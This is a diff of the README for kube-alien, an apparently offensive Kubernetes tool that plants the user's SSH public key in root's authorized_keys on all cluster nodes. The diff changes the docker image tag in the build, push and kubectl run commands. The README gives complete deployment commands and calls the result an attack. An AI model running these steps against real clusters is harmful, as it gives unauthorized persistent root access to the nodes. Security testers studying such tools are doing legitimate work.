@@ -24,17 +24,17 @@ Kube-alien image should be pushed to your dockerhub(or other registry) before us
 git clone https://github.com/nixwizard/kube-alien.git
 cd kube-alien
 docker build -t ka ./
-docker tag ka YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka
-docker push YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka
+docker tag ka YOUR_DOCKERHUB_ACCOUNT/kube-alien
+docker push YOUR_DOCKERHUB_ACCOUNT/kube-alien
 ```
 The AUTHORIZED_KEYS env required to be set to the value of your ssh public key, in case of success the public key will be added to all 
 node's root's authorized_keys file.
 ```
-kubectl run --image=YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka kube-alien --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never
+kubectl run --image=YOUR_DOCKERHUB_ACCOUNT/kube-alien kube-alien --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never
 ```
 or you may use my image for quick testing purpose:
 ```
-kubectl run --image=nixwizard/kube-alien kube-alien:ka --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never
+kubectl run --image=nixwizard/kube-alien kube-alien --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never
 ```
 Check Kube-alien pod's logs to see if attack was successful:
 ```
